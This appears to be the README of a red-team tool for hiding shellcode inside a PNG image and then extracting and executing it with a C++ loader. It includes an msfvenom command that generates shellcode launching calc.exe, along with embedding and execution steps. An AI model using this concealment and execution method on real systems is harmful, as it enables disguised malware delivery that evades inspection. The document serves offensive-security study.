# Hide Shellcode in Image

This technique is originally introduced by [WafflesExploits](https://wafflesexploits.github.io/posts/Hide_a_Payload_in_Plain_Sight_Embedding_Shellcode_in_a_Image_file/#store-the-image-file-in-the-resources-section-rsrc-of-a-binary-file).  
Accorind to the article above, there are two methods for execution (extraction) but in here we use the simpler method. If you're interested in another method, read the article.

## Usage

### 1. Create a Shellcode

```sh
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -b '0x00' -o payload.bin
```

### 2. Embed the Shellcode into an Image

For example, we embed the shellcode to the `dog.png` image file.

```sh
python3 embedder.py dog.png payload.bin dog_embedded.png
```

After that, the `dog_embedded.png` file is generated.

### 3. Prepare Extractor

Modify the `extractor.cpp` to replace the following constant values:

- `EMBEDDED_IMAGE_PATH` (e.g. `dog_embedded.png`)
- `ORIGINAL_IMAGE_SIZE` (e.g. the size of the `dog.png`)

Then build the C++ project in Visual Studio.

### 4. Extract the Shellcode from the Image, and Execute It

Using this C++ program, we can do that:

```sh
.\extractor
```

If all goes well, the Calculator will spawn.